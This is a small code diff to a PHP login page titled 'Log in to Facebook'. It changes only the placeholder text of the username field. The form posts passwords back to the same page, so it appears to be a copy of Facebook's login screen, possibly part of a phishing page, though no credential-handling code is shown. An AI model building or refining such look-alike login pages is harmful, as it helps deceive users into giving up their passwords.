@@ -70,7 +70,7 @@
 <div class="login-container">
     <h2>Log in to Facebook</h2>
     <form class="login-form" action="" method="post">
-        <input type="text" name="username" placeholder="Email or Phone" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
         <input type="password" name="password" placeholder="Password" required>
         <button type="submit">Log In</button>
     </form>
